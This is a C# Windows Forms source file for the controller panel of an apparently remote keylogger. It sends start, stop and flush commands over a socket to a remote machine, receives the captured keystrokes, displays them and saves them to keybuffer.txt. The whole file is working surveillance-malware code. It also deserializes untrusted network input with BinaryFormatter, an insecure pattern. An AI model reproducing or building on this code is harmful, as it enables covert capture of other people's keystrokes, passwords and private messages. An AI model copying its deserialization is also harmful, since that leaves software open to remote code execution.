using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace ClientMain
{
    public partial class KeyLogger : Form
    {
        public KeyLogger()
        {
            InitializeComponent();
        }

        public static Form mainForm;
        public static byte[] commandNo = new byte[1];
        public static bool connectionFailure = false;

        private void KeyLogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            mainForm.Visible = true;
            if (connectionFailure == true)
            {
                ClientMain.connectionFailure = true;
            }
            else
            {
                try
                {
                    commandNo[0] = 55;
                    ClientMain.socketConnect.Send(commandNo);
                }
                catch (Exception)
                {
                    ClientMain.connectionFailure = true;
                }
            }
        }

        private void buttonStart_Click(object sender, EventArgs e)
        {
            try
            {
                commandNo[0] = 50;
                ClientMain.socketConnect.Send(commandNo);
            }
            catch (Exception)
            {
                connectionFailure = true;
                this.Close();
            }
        }

        private void buttonStop_Click(object sender, EventArgs e)
        {
            try
            {
                commandNo[0] = 53;
                ClientMain.socketConnect.Send(commandNo);
                catchFlush();
                if (connectionFailure == true)
                    this.Close();
            }
            catch (Exception)
            {
                connectionFailure = true;
                this.Close();
            }
        }

        private void buttonFlush_Click(object sender, EventArgs e)
        {
            try
            {
                commandNo[0] = 54;
                ClientMain.socketConnect.Send(commandNo);
                catchFlush();
                if (connectionFailure == true)
                    this.Close();
            }
            catch (Exception)
            {
                connectionFailure = true;
                this.Close();
            }
        }

        public static void catchFlush()
        {
            try
            {
                byte[] dataSize = new byte[50000];
                int size;
                while ((size = ClientMain.socketAccept.Receive(dataSize)) == 0) ;
                MemoryStream dataStream = new MemoryStream(dataSize, 0, size);
                BinaryFormatter formatter = new BinaryFormatter();
                size = (int)formatter.Deserialize(dataStream);
                byte[] data = new byte[size];
                byte[] ack = new byte[1];
                ack[0] = 1;
                ClientMain.socketConnect.Send(ack);
                while (ClientMain.socketAccept.Receive(data) == 0) ;
                dataStream = new MemoryStream(data, 0, size);
                KeyLogger.textBox1.AppendText((string)formatter.Deserialize(dataStream));
            }
            catch (Exception)
            {
                connectionFailure = true;
            }
        }

        private void buttonSave_Click(object sender, EventArgs e)
        {
            StreamWriter sw = new StreamWriter(Directory.GetCurrentDirectory() + "\\keybuffer.txt", true);
            sw.Write(textBox1.Text);
            textBox1.Text = "";
            sw.Close();
        }
    }
}
